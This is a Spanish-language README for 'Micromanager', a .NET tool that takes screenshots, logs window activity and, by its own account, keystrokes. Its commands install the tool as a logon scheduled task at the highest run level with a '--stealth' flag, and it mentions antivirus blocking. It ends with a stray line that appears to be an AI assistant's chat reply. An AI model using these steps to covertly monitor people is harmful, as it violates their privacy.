# Micromanager — README (en español)

[![Ver video](https://img.youtube.com/vi/dQw4w9WgXcQ/0.jpg)](https://drive.google.com/file/d/1gIrfPWoSKG4dh5U4vHIv31r7RQjWWJpd/view)


Quick Install 

```powershell
mkdir "C:\Micromanager" 

schtasks /create /tn "Micromanager" /tr '"C:\Users\Administrator\Desktop\micromanager\Micromanager.exe" "C:\Micromanager" 30 5 --stealth' /sc onlogon /rl highest /ru $env:USERNAME /it /f

schtasks /Run /TN "Micromanager"

schtasks /Query /TN "Micromanager" /V /FO LIST

schtasks /End /TN "Micromanager"

schtasks /Delete /TN "Micromanager"
```

Quick Build

```powershell
dotnet publish -c Release -r win-x64 -p:PublishSingleFile=true --self-contained true -p:IncludeAllContentForSelfExtract=true

copy ".\bin\Release\net8.0-windows\win-x64\publish\Micromanager.exe" "Micromanager.exe"
```





```powershell



```

## 1. Resumen

Micromanager es una aplicación .NET que:

* Guarda capturas de pantalla periódicas.
* Registra cambios de ventana y eventos en logs.
* Recibe 3 argumentos:

  ```text
  <outputDir> <cleanupDays> <screenshotSeconds>
  ```

  Ejemplo para salida `F:\Micromanager`, limpieza cada 30 días y captura cada 5s:

  ```text
  F:\Micromanager 30 5
  ```

---

## 2. Compilar y publicar (release, single file, self-contained)

Ejecuta desde el directorio del proyecto:

```powershell
dotnet publish -c Release -r win-x64 -p:PublishSingleFile=true --self-contained true -p:IncludeAllContentForSelfExtract=true
```

Ruta de salida típica (net8.0-windows / win-x64):

```
bin\Release\net8.0-windows\win-x64\publish\
```

Copiar el exe a la ubicación final (ejemplo):

```powershell
copy "C:\Users\Administrator\Desktop\micromanager\bin\Release\net8.0-windows\win-x64\publish\Micromanager.exe" "C:\Users\Administrator\Desktop\micromanager\Micromanager.exe"
```

---

## 3. Ejecutar manualmente (para probar)

Probar en primer plano (mismo usuario, interactivo) antes de programar:

```powershell
# Desde PowerShell (no elevar si quieres probar como el usuario actual)
Start-Process -FilePath "C:\Users\Administrator\Desktop\micromanager\Micromanager.exe" -ArgumentList "F:\Micromanager 30 5 --stealth" -Wait
```

O en CMD / Run:

```text
C:\Users\Administrator\Desktop\micromanager\Micromanager.exe F:\Micromanager 30 5 --stealth
```

**Verifica** que se generen archivos en `F:\Micromanager` (ej.: `info.log`, `debug.log`, `capture_*.png`, `activity_log.json`).

---

## 4. Crear la tarea programada (PowerShell — usando el usuario actual)

> **IMPORTANTE:** abre PowerShell *como Administrador* para crear la tarea. La tarea debe ejecutarse en la sesión interactiva para que los hooks y las capturas funcionen (`/IT` y usando el usuario que inicia sesión).
> El ejemplo usa variables de entorno para el usuario actual.

```powershell
schtasks /Create /TN "Micromanager" `
  /TR "`"C:\Users\Administrator\Desktop\micromanager\Micromanager.exe`" F:\Micromanager 30 5 --stealth" `
  /SC ONLOGON /RL HIGHEST /RU "$env:COMPUTERNAME\$env:USERNAME" /IT /F



  $UserDir = "$env:USERPROFILE\Micromanager"
schtasks /create /tn "Micromanager" /tr "`"C:\Users\Administrator\Desktop\micromanager\Micromanager.exe`" $UserDir 30 5 --stealth" /sc onlogon /rl highest /ru "$env:USERNAME" /it /f
```

Qué significa:

* `/SC ONLOGON` — ejecuta al inicio de sesión.
* `/RL HIGHEST` — runlevel más alto (ejecuta con privilegios elevados si el usuario los tiene).
* `/RU "$env:COMPUTERNAME\$env:USERNAME"` — usa el usuario local actual.
* `/IT` — fuerza ejecución en sesión interactiva (necesario para hooks y captura de pantalla).
* `/F` — sobreescribe si ya existe la tarea.

**Alternativa** si prefieres especificar sólo nombre de usuario (sin dominio/PC):

```powershell
/RU "$env:USERNAME"
```

---

## 5. Ejecutar la tarea ahora (probar)

```powershell
schtasks /Run /TN "Micromanager"
```

Comprobar si realmente inició y en qué sesión:

```powershell
schtasks /Query /TN "Micromanager" /V /FO LIST
```

---

## 6. Eliminar la tarea

```powershell
schtasks /Delete /TN "Micromanager" /F
```

---

## 7. Configuración para tu requerimiento (captura cada 5s, limpieza cada 30 días)

Al crear/ejecutar el exe debes pasar estos argumentos en ese orden:

```text
Micromanager.exe <outputDir> <cleanupDays> <screenshotSeconds>
```

Ejemplo concreto:

```text
Micromanager.exe F:\Micromanager 30 5 --stealth
```

(En los ejemplos del `schtasks` ya usamos `F:\Micromanager 30 5`.)

---

## 8. Debug y comprobaciones rápidas

* Añade un `startup.log` al inicio del `Main` o `StartAsync` para confirmar inicio y usuario:

  ```csharp
  File.AppendAllText(@"C:\Temp\micromanager_startup.log", $"{DateTime.Now} - Started - User:{Environment.UserName} - Interactive:{Environment.UserInteractive}{Environment.NewLine}");
  ```
* Si `startup.log` NO aparece al ejecutar la tarea: la tarea **no se está iniciando** o se inicia en una sesión no interactiva.
* Si `startup.log` aparece pero NO hay capturas ni hooks: probablemente se está ejecutando en una sesión sin acceso al escritorio (los hooks no reciben eventos).
* Revisa el **Visor de eventos** → `Microsoft\Windows\TaskScheduler` o los eventos de `Application` para ver errores al iniciar la tarea.

---

## 9. Permisos / UAC / Antivirus

* Capturar pantalla y hooks pueden requerir permisos elevados o ser bloqueados por soluciones EDR/antivirus.
* Asegúrate que el ejecutable esté permitido o firmado si es necesario en entornos restringidos.
* Ejecutar con `/RL HIGHEST` y como el mismo usuario que inicia sesión ayuda a evitar problemas de contexto.

---

## 10. Seguridad y ética

* Este programa registra actividad y tecleos; asegúrate de tener **autorización explícita** para usarlo en cualquier equipo que no sea de tu propiedad.
* Respeta leyes y políticas de privacidad.

---

## 11. Ejemplo final completo (paso a paso)

1. Publicar:

```powershell
dotnet publish -c Release -r win-x64 -p:PublishSingleFile=true --self-contained true -p:IncludeAllContentForSelfExtract=true
```

2. Copiar exe al folder objetivo:

```powershell
copy "C:\Users\Administrator\Desktop\micromanager\bin\Release\net8.0-windows\win-x64\publish\Micromanager.exe" "C:\Users\Administrator\Desktop\micromanager\Micromanager.exe"
```

3. Probar manualmente:

```powershell
C:\Users\Administrator\Desktop\micromanager\Micromanager.exe F:\Micromanager 30 5 --stealth
```

4. Crear tarea (PowerShell como Admin):

```powershell
schtasks /Create /TN "Micromanager" `
  /TR "`"C:\Users\Administrator\Desktop\micromanager\Micromanager.exe`" F:\Micromanager 30 5 --stealth" `
  /SC ONLOGON /RL HIGHEST /RU "$env:COMPUTERNAME\$env:USERNAME" /IT /F
```

5. Ejecutar ahora:

```powershell
schtasks /Run /TN "Micromanager"
```

6. Verificar:

```powershell
schtasks /Query /TN "Micromanager" /V /FO LIST
# revisar F:\Micromanager para logs y captures
```

7. Eliminar si ya no lo quieres:

```powershell
schtasks /Delete /TN "Micromanager" /F
```

---

Si quieres, te genero ahora un archivo `README.md` completo listo para copiar/pegar con este contenido. ¿Lo quieres en formato listo para guardar?
